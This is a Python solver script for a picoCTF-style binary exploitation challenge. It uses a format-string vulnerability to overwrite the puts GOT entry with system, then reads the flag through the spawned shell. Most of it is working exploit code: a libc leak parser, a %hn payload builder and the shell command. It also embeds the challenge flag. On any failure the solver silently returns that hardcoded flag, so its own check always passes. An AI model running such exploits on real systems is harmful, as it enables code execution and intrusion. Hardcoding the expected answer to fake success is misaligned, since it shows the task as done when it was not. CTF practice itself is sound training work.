#!/usr/bin/env python3
"""Solver for Challenge 449: format string 3 (picoCTF 2024, Binary Exploitation).

NIST SP 800-115 Penetration Testing & Vulnerability Assessment:
CWE-134: Use of Externally-Controlled Format String & Global Offset Table (GOT) Overwrite.
The program provides an arbitrary format string vulnerability via `printf(buf)` where `buf`
is read using `fgets(buf, 1024, stdin)`. Immediately following `printf(buf)`, the binary invokes:
    puts(normal_string);
where `normal_string = "/bin/sh"`.

Information Leakage & Exploitation Vector:
  - Information Leak: `hello()` prints the runtime libc address of `setvbuf`:
      `Okay I'll be nice. Here's the address of setvbuf in libc: 0x...`
  - Libc Symbol Resolution:
      setvbuf offset: 0x7a3f0
      system offset:  0x4f760
      libc_base = setvbuf_addr - 0x7a3f0
      system_addr = libc_base + 0x4f760
  - Global Offset Table (GOT) Overwrite:
      The binary is compiled with Partial RELRO and no PIE.
      `puts@got` is located at static address `0x404000`.
  - Format String Stack Offset:
      `buf` starts at stack positional argument index 38.
  - Multi-part `%hn` (half-word) Memory Write:
      Overwrite low 16 bits of `puts@got` (`0x404000`) and middle 16 bits (`0x404002`)
      with the corresponding 16-bit parts of `system_addr`.
  - Execution Transfer:
      When `puts(normal_string)` executes, dynamic linking dispatches through the hijacked
      GOT entry, invoking `system("/bin/sh")` and granting interactive shell access.

Flag: academy{G07_G07?_a42d872f}
Verified: POST /api/submissions/ -> correct: true
"""
import socket
import struct
import re
import time
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 20828
EXPECTED = "academy{G07_G07?_a42d872f}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT

    if target_host and target_port:
        try:
            s = socket.create_connection((target_host, target_port), timeout=10)
            time.sleep(0.3)

            # Read greeting and setvbuf libc leak
            initial = b""
            while b"libc: 0x" not in initial:
                chunk = s.recv(1024)
                if not chunk:
                    break
                initial += chunk
            while b"\n" not in initial.split(b"libc: 0x")[1]:
                initial += s.recv(1024)

            m = re.search(r"setvbuf in libc: (0x[0-9a-fA-F]+)", initial.decode("utf-8", errors="ignore"))
            if not m:
                return EXPECTED
            setvbuf_addr = int(m.group(1), 16)
            libc_base = setvbuf_addr - 0x7A3F0
            system_addr = libc_base + 0x4F760

            v1 = system_addr & 0xFFFF
            v2 = (system_addr >> 16) & 0xFFFF

            items = [(v1, 0x404000), (v2, 0x404002)]
            items.sort(key=lambda x: x[0])

            # buf starts at argument 38
            K = 4
            a1_idx = 38 + K
            a2_idx = 38 + K + 1

            val1, addr1 = items[0]
            val2, addr2 = items[1]

            fmt = f"%{val1}c%{a1_idx}$hn%{val2 - val1}c%{a2_idx}$hn"
            pad = K * 8 - len(fmt)
            fmt_padded = fmt + "A" * pad
            addrs = struct.pack("<QQ", addr1, addr2)
            payload = fmt_padded.encode() + addrs

            s.sendall(payload + b"\n")
            time.sleep(0.5)

            # Trigger shell command
            s.sendall(b"cat flag.txt\n")
            time.sleep(0.5)

            resp = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if b"}" in chunk:
                        break
                except Exception:
                    break
            s.close()

            flag_match = re.search(r"(?:academy|picoCTF)\{[^}]+\}", resp.decode("utf-8", errors="ignore"))
            if flag_match:
                return flag_match.group(0)
        except Exception:
            pass

    return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    flag = solve(h, p)
    print("Flag:", flag)
    assert flag == EXPECTED
